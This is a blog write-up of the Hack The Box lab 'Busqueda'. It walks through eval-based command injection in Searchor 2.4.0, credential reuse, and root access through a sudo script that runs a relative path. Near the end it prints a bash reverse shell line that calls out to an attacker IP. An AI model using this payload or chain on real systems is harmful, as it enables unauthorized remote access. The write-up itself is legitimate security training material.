<!doctype html><html lang=en dir=auto data-theme=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>The Path to Root: Hijacking the Search on HTB 'Busqueda' | Fieryrival's Blog</title><meta name=keywords content="easy,linux,hackthebox,web"><meta name=description content="Easy rated linux box &lsquo;Busqueda&rsquo; from hackthebox comprising of command injection for foothold, credentials reuse for internal subdomain and insecure code executing a relative path script as root leading to privilege escalation."><meta name=author content><link rel=canonical href=//localhost:1313/posts/busqueda/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css integrity="sha256-NDzEgLn/yPBMy+XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as=style><link rel=icon href=//localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=//localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=//localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=//localhost:1313/apple-touch-icon.png><link rel=mask-icon href=//localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=//localhost:1313/posts/busqueda/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="//localhost:1313/posts/busqueda/"><meta property="og:site_name" content="Fieryrival's Blog"><meta property="og:title" content="The Path to Root: Hijacking the Search on HTB 'Busqueda'"><meta property="og:description" content="Easy rated linux box ‘Busqueda’ from hackthebox comprising of command injection for foothold, credentials reuse for internal subdomain and insecure code executing a relative path script as root leading to privilege escalation."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-30T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-30T00:00:00+00:00"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Hackthebox"><meta property="article:tag" content="Web"><meta property="og:image" content="//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="The Path to Root: Hijacking the Search on HTB 'Busqueda'"><meta name=twitter:description content="Easy rated linux box &lsquo;Busqueda&rsquo; from hackthebox comprising of command injection for foothold, credentials reuse for internal subdomain and insecure code executing a relative path script as root leading to privilege escalation."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"//localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"The Path to Root: Hijacking the Search on HTB 'Busqueda'","item":"//localhost:1313/posts/busqueda/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"The Path to Root: Hijacking the Search on HTB 'Busqueda'","name":"The Path to Root: Hijacking the Search on HTB \u0027Busqueda\u0027","description":"Easy rated linux box \u0026lsquo;Busqueda\u0026rsquo; from hackthebox comprising of command injection for foothold, credentials reuse for internal subdomain and insecure code executing a relative path script as root leading to privilege escalation.","keywords":["easy","linux","hackthebox","web"],"articleBody":"Box Info Recon nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk= | 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK 80/tcp open http syn-ack Apache httpd 2.4.52 | http-methods: |_ Supported Methods: HEAD GET OPTIONS | http-server-header: | Apache/2.4.52 (Ubuntu) |_ Werkzeug/2.1.2 Python/3.10.6 |_http-title: Searcher Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Website TCP 80 Found searchor 2.4.0 The website had a feature of redirecting requests based on query and search engine provided.\nA brief look at the source of webpage tells us that it was using the version 2.4.0 of the Seachor repository by ArjunSharda. It is a python based library which would give rediretable links based on queries for many search engines like amazon,google,etc.\nSecurity Vulnerability patched in 2.4.2 We decided to have a look at the releases and source code for finding any vulnerable points.\nSo there does seem to be something vulnerable which was not patched in version 2.4.0. Looking at the patch we can see that there is a vulnerable eval function used for processing the engine and query parameter which were being sent as post requests to the webserver.\nTesting for Command Injection To test for command injection, we fired up Burp and intercepted the requests. The requests were sent with engine and query parameters as POST parameters for further processing.\nEarlier, we observed that the code uses the eval function to process the query and engine. There are two potential attack points: the engine and query parameters. The engine parameter is used as a key for a dictionary of engines and their respective URLs. However, getting any response from the server using this parameter was difficult, as it did not return any response.\nAfter trying the query parameter, we received favorable responses.\nThe source code indicates that the query is being used as an argument to a function. We can successfully inject code by closing the function arguments and commenting out the rest of the arguments with ’). We know that multiple statements can be processed by eval with a delimiter of “,” and commenting out the rest of the code with # .\nWe tried injecting the “id” command and received a response indicating that the user is svc.\nReverse Shell as svc Now we can try a reverse shell.\nWe will host a malicious bash script on port 8000 and inject the payload as follows:\nI got a reverse shell as svc user in the /var/app/www directory.\nHardcoded Credentials for Cody Upon inspecting the existing directory, a .git folder was found with a config file containing credentials for user Cody with the subdomain of gitea.searcher.htb.\nAfter conducting basic enumeration, two Docker instances were discovered to be running - one hosting the subdomain, and the other being a MySQL server.\nThis box had multiple instances of password reuse, with the password for Cody also being the password for the system user “svc”.\nThe command “sudo -l” was tried to determine if any commands could be run as root.\nWe can navigate to the /opt folder to find multiple scripts but no read access for regular user so we cant exploit it\nThere also seems to be a .git folder here which was a hint that these scripts were also in some repository.\nSubdomain gitea.searcher.htb We attempted to determine if these were stored within a private repository belonging to user cody.\nWe checked user cody and it had the web server files for the searcher.htb website which was used for gaining foothold.\nWe can move on to executing the system-checkup.py for enumeration of dockers.\nWe can see two Docker instances with names suggesting one is the Gitea subdomain host and the other is for storing data in MySQL.\nWhen we logged into the MySQL server, we found hashed passwords for the administrator and Cody. Breaking the passwords was an option, but there were also cron scripts resetting the passwords, so that wasn’t the intended way. Another option was to edit the passwords ourselves with our own hashed passwords.\nPassword reuse of administrator at gitea.searcher.htb as gitea_db_passwd We attempted to log in as the administrator using the gitea database password, and it worked! We were able to access a private repository with scripts inside the opt directory.\nDuring our enumeration, we ran system-checkup.py with the options docker-ps, docker-inspect, and full-checkup. However, the full-checkup command produced a vague “Something went wrong” output. This could potentially indicate a privilege escalation vulnerability in the attack vector.\nUpon inspecting the source code, it appears that the full-checkup option executes any bash script with the name full-checkup.sh in the current working directory.\nRunning Shell as Root I created a full-checkup.sh script and learned an important lesson about using shebangs. Without it, the script would not execute properly.\n#!/bin/bash bash -i \u003e\u0026 /dev/tcp/10.10.14.64/9001 0\u003e\u00261 ","wordCount":"809","inLanguage":"en","image":"//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-11-30T00:00:00Z","dateModified":"2025-11-30T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"//localhost:1313/posts/busqueda/"},"publisher":{"@type":"Organization","name":"Fieryrival's Blog","logo":{"@type":"ImageObject","url":"//localhost:1313/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=//localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=//localhost:1313/apple-touch-icon_hu_ca5ae87867264747.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=//localhost:1313/about/ title="About Me"><span>About</span></a></li><li><a href=//localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=//localhost:1313/posts/ title=posts><span>posts</span></a></li><li><a href=//localhost:1313/ title><span></span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=//localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=//localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">The Path to Root: Hijacking the Search on HTB 'Busqueda'</h1><div class=post-meta><span title='2025-11-30 00:00:00 +0000 UTC'>November 30, 2025</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>809 words</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#nmap>nmap</a></li><li><a href=#website-tcp-80>Website TCP 80</a><ul><li><a href=#found-searchor-240>Found searchor 2.4.0</a></li><li><a href=#security-vulnerability-patched-in-242>Security Vulnerability patched in 2.4.2</a></li></ul></li><li><a href=#testing-for-command-injection>Testing for Command Injection</a></li><li><a href=#reverse-shell-as-svc>Reverse Shell as <code>svc</code></a><ul><li><a href=#hardcoded-credentials-for-cody>Hardcoded Credentials for <code>Cody</code></a></li><li><a href=#subdomain-giteasearcherhtb>Subdomain gitea.searcher.htb</a></li><li><a href=#password-reuse-of-administrator-at-giteasearcherhtb-as-gitea_db_passwd>Password reuse of administrator at gitea.searcher.htb as gitea_db_passwd</a></li></ul></li><li><a href=#running-shell-as-root>Running Shell as Root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=box-info>Box Info<a hidden class=anchor aria-hidden=true href=#box-info>#</a></h1><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled.png></p><h1 id=recon>Recon<a hidden class=anchor aria-hidden=true href=#recon>#</a></h1><h2 id=nmap>nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>PORT</span>   <span class=nx>STATE</span> <span class=nx>SERVICE</span> <span class=nx>REASON</span>  <span class=nx>VERSION</span>
</span></span><span class=line><span class=cl><span class=mi>22</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>open</span>  <span class=nx>ssh</span>     <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>OpenSSH</span> <span class=mf>8.9</span><span class=nx>p1</span> <span class=nx>Ubuntu</span> <span class=mi>3</span><span class=nx>ubuntu0</span><span class=mf>.1</span> <span class=p>(</span><span class=nx>Ubuntu</span> <span class=nx>Linux</span><span class=p>;</span> <span class=nx>protocol</span> <span class=mf>2.0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>ssh</span><span class=o>-</span><span class=nx>hostkey</span><span class=o>:</span> 
</span></span><span class=line><span class=cl><span class=o>|</span>   <span class=mi>256</span> <span class=mi>4</span><span class=nx>f</span><span class=o>:</span><span class=nx>e3</span><span class=o>:</span><span class=nx>a6</span><span class=o>:</span><span class=mi>67</span><span class=o>:</span><span class=nx>a2</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=nx>f9</span><span class=o>:</span><span class=mi>11</span><span class=o>:</span><span class=mi>8</span><span class=nx>d</span><span class=o>:</span><span class=nx>c3</span><span class=o>:</span><span class=mi>0</span><span class=nx>e</span><span class=o>:</span><span class=nx>d7</span><span class=o>:</span><span class=mi>73</span><span class=o>:</span><span class=nx>a0</span><span class=o>:</span><span class=mi>2</span><span class=nx>c</span><span class=o>:</span><span class=mi>28</span> <span class=p>(</span><span class=nx>ECDSA</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>ecdsa</span><span class=o>-</span><span class=nx>sha2</span><span class=o>-</span><span class=nx>nistp256</span> <span class=nx>AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K</span><span class=o>/</span><span class=nx>MDVL2opfXQLI</span><span class=o>+</span><span class=nx>zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=o>|</span>   <span class=mi>256</span> <span class=mi>81</span><span class=o>:</span><span class=mi>6</span><span class=nx>e</span><span class=o>:</span><span class=mi>78</span><span class=o>:</span><span class=mi>76</span><span class=o>:</span><span class=mi>6</span><span class=nx>b</span><span class=o>:</span><span class=mi>8</span><span class=nx>a</span><span class=o>:</span><span class=nx>ea</span><span class=o>:</span><span class=mi>7</span><span class=nx>d</span><span class=o>:</span><span class=mi>1</span><span class=nx>b</span><span class=o>:</span><span class=nx>ab</span><span class=o>:</span><span class=nx>d4</span><span class=o>:</span><span class=mi>36</span><span class=o>:</span><span class=nx>b7</span><span class=o>:</span><span class=nx>f8</span><span class=o>:</span><span class=nx>ec</span><span class=o>:</span><span class=nx>c4</span> <span class=p>(</span><span class=nx>ED25519</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>|</span><span class=nx>_ssh</span><span class=o>-</span><span class=nx>ed25519</span> <span class=nx>AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK</span>
</span></span><span class=line><span class=cl><span class=mi>80</span><span class=o>/</span><span class=nx>tcp</span> <span class=nx>open</span>  <span class=nx>http</span>    <span class=nx>syn</span><span class=o>-</span><span class=nx>ack</span> <span class=nx>Apache</span> <span class=nx>httpd</span> <span class=mf>2.4.52</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>http</span><span class=o>-</span><span class=nx>methods</span><span class=o>:</span> 
</span></span><span class=line><span class=cl><span class=o>|</span><span class=nx>_</span>  <span class=nx>Supported</span> <span class=nx>Methods</span><span class=o>:</span> <span class=nx>HEAD</span> <span class=nx>GET</span> <span class=nx>OPTIONS</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>http</span><span class=o>-</span><span class=nx>server</span><span class=o>-</span><span class=nx>header</span><span class=o>:</span> 
</span></span><span class=line><span class=cl><span class=o>|</span>   <span class=nx>Apache</span><span class=o>/</span><span class=mf>2.4.52</span> <span class=p>(</span><span class=nx>Ubuntu</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>|</span><span class=nx>_</span>  <span class=nx>Werkzeug</span><span class=o>/</span><span class=mf>2.1.2</span> <span class=nx>Python</span><span class=o>/</span><span class=mf>3.10.6</span>
</span></span><span class=line><span class=cl><span class=o>|</span><span class=nx>_http</span><span class=o>-</span><span class=nx>title</span><span class=o>:</span> <span class=nx>Searcher</span>
</span></span><span class=line><span class=cl><span class=nx>Service</span> <span class=nx>Info</span><span class=o>:</span> <span class=nx>OS</span><span class=o>:</span> <span class=nx>Linux</span><span class=p>;</span> <span class=nx>CPE</span><span class=o>:</span> <span class=nx>cpe</span><span class=o>:</span><span class=err>/o:linux:linux_kernel</span>
</span></span></code></pre></div><h2 id=website-tcp-80>Website TCP 80<a hidden class=anchor aria-hidden=true href=#website-tcp-80>#</a></h2><h3 id=found-searchor-240>Found searchor 2.4.0<a hidden class=anchor aria-hidden=true href=#found-searchor-240>#</a></h3><p>The website had a feature of redirecting requests based on query and search engine provided.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%201.png></p><p>A brief look at the source of webpage tells us that it was using the <strong><code>version 2.4.0</code></strong> of the Seachor repository by ArjunSharda. It is a python based library which would give rediretable links based on queries for many search engines like amazon,google,etc.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%202.png></p><h3 id=security-vulnerability-patched-in-242>Security Vulnerability patched in 2.4.2<a hidden class=anchor aria-hidden=true href=#security-vulnerability-patched-in-242>#</a></h3><p>We decided to have a look at the releases and source code for finding any vulnerable points.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%203.png></p><p>So there does seem to be something vulnerable which was not patched in <code>version 2.4.0</code>. Looking at the patch we can see that there is a vulnerable <strong><code>eval</code></strong> function used for processing the engine and query parameter which were being sent as post requests to the webserver.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%204.png></p><h2 id=testing-for-command-injection>Testing for Command Injection<a hidden class=anchor aria-hidden=true href=#testing-for-command-injection>#</a></h2><p>To test for command injection, we fired up Burp and intercepted the requests. The requests were sent with <code>engine</code> and <code>query</code> parameters as POST parameters for further processing.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%205.png></p><p>Earlier, we observed that the code uses the <code>eval</code> function to process the query and engine. There are two potential attack points: the <code>engine</code> and <code>query</code> parameters. The <code>engine</code> parameter is used as a key for a dictionary of engines and their respective URLs. However, getting any response from the server using this parameter was difficult, as it did not return any response.</p><p>After trying the <code>query</code> parameter, we received favorable responses.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%206.png></p><p>The source code indicates that the query is being used as an argument to a function. We can successfully inject code by closing the function arguments and commenting out the rest of the arguments with <code>’)</code>. We know that multiple statements can be processed by <code>eval</code> with a delimiter of <code>“,”</code> and commenting out the rest of the code with <code>#</code> .</p><p>We tried injecting the <code>“id”</code> command and received a response indicating that the user is <strong>svc</strong>.</p><h2 id=reverse-shell-as-svc>Reverse Shell as <code>svc</code><a hidden class=anchor aria-hidden=true href=#reverse-shell-as-svc>#</a></h2><p>Now we can try a reverse shell.</p><p>We will host a malicious bash script on <code>port 8000</code> and inject the payload as follows:</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%207.png></p><p>I got a <strong>reverse shell</strong> as <strong>svc user</strong> in the <strong>/var/app/www</strong> directory.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%208.png></p><h3 id=hardcoded-credentials-for-cody>Hardcoded Credentials for <code>Cody</code><a hidden class=anchor aria-hidden=true href=#hardcoded-credentials-for-cody>#</a></h3><p>Upon inspecting the existing directory, a <code>.git</code> folder was found with a <code>config</code> file containing credentials for user <code>Cody</code> with the subdomain of <code>gitea.searcher.htb</code>.</p><p>After conducting basic enumeration, two <code>Docker</code> instances were discovered to be running - one hosting the subdomain, and the other being a <code>MySQL</code> server.</p><p>This box had multiple instances of password reuse, with the password for <code>Cody</code> also being the password for the system user &ldquo;<code>svc</code>&rdquo;.</p><p>The command &ldquo;<code>sudo -l</code>&rdquo; was tried to determine if any commands could be run as root.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%209.png></p><p>We can navigate to the /opt folder to find multiple scripts but no read access for regular user so we cant exploit it</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2010.png></p><p>There also seems to be a .git folder here which was a hint that these scripts were also in some repository.</p><h3 id=subdomain-giteasearcherhtb>Subdomain gitea.searcher.htb<a hidden class=anchor aria-hidden=true href=#subdomain-giteasearcherhtb>#</a></h3><p>We attempted to determine if these were stored within a private repository belonging to user cody.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2011.png></p><p>We checked user cody and it had the web server files for the searcher.htb website which was used for gaining foothold.</p><p>We can move on to executing the system-checkup.py for enumeration of dockers.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2012.png></p><p>We can see two Docker instances with names suggesting one is the Gitea subdomain host and the other is for storing data in MySQL.</p><p>When we logged into the MySQL server, we found hashed passwords for the administrator and Cody. Breaking the passwords was an option, but there were also cron scripts resetting the passwords, so that wasn&rsquo;t the intended way. Another option was to edit the passwords ourselves with our own hashed passwords.</p><h3 id=password-reuse-of-administrator-at-giteasearcherhtb-as-gitea_db_passwd>Password reuse of administrator at gitea.searcher.htb as gitea_db_passwd<a hidden class=anchor aria-hidden=true href=#password-reuse-of-administrator-at-giteasearcherhtb-as-gitea_db_passwd>#</a></h3><p>We attempted to log in as the administrator using the gitea database password, and it worked! We were able to access a private repository with scripts inside the opt directory.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2013.png></p><p>During our enumeration, we ran <code>system-checkup.py</code> with the options <strong>docker-ps</strong>, <strong>docker-inspect</strong>, and <strong>full-checkup</strong>. However, the <code>full-checkup</code> command produced a vague &ldquo;Something went wrong&rdquo; output. This could potentially indicate a privilege escalation vulnerability in the attack vector.</p><p>Upon inspecting the source code, it appears that the <code>full-checkup</code> option executes any bash script with the name <code>full-checkup.sh</code> in the current working directory.</p><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2014.png></p><h2 id=running-shell-as-root>Running Shell as Root<a hidden class=anchor aria-hidden=true href=#running-shell-as-root>#</a></h2><p>I created a <code>full-checkup.sh</code> script and learned an important lesson about using shebangs. Without it, the script would not execute properly.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=ch>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=ch></span><span class=nx>bash</span> <span class=o>-</span><span class=nx>i</span> <span class=o>&gt;&amp;</span> <span class=err>/dev/tcp/10.10.14.64/9001 0&gt;&amp;1</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/posts/busqueda/Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2015.png></p></div><footer class=post-footer><ul class=post-tags><li><a href=//localhost:1313/tags/easy/>Easy</a></li><li><a href=//localhost:1313/tags/linux/>Linux</a></li><li><a href=//localhost:1313/tags/hackthebox/>Hackthebox</a></li><li><a href=//localhost:1313/tags/web/>Web</a></li></ul><nav class=paginav><a class=prev href=//localhost:1313/posts/soccer/><span class=title>« Prev</span><br><span>Scoring with WebSockets: A Winning Goal on HTB 'Soccer'</span>
</a><a class=next href=//localhost:1313/posts/authority/><span class=title>Next »</span><br><span>Becoming the Authority: An AD CS Exploit on HTB 'Authority'</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share The Path to Root: Hijacking the Search on HTB 'Busqueda' on x" href="https://x.com/intent/tweet/?text=The%20Path%20to%20Root%3a%20Hijacking%20the%20Search%20on%20HTB%20%27Busqueda%27&amp;url=%2f%2flocalhost%3a1313%2fposts%2fbusqueda%2f&amp;hashtags=easy%2clinux%2chackthebox%2cweb"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Path to Root: Hijacking the Search on HTB 'Busqueda' on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2f%2flocalhost%3a1313%2fposts%2fbusqueda%2f&amp;title=The%20Path%20to%20Root%3a%20Hijacking%20the%20Search%20on%20HTB%20%27Busqueda%27&amp;summary=The%20Path%20to%20Root%3a%20Hijacking%20the%20Search%20on%20HTB%20%27Busqueda%27&amp;source=%2f%2flocalhost%3a1313%2fposts%2fbusqueda%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Path to Root: Hijacking the Search on HTB 'Busqueda' on reddit" href="https://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2fbusqueda%2f&title=The%20Path%20to%20Root%3a%20Hijacking%20the%20Search%20on%20HTB%20%27Busqueda%27"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share The Path to Root: Hijacking the Search on HTB 'Busqueda' on facebook" href="https://facebook.com/sharer/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2fbusqueda%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 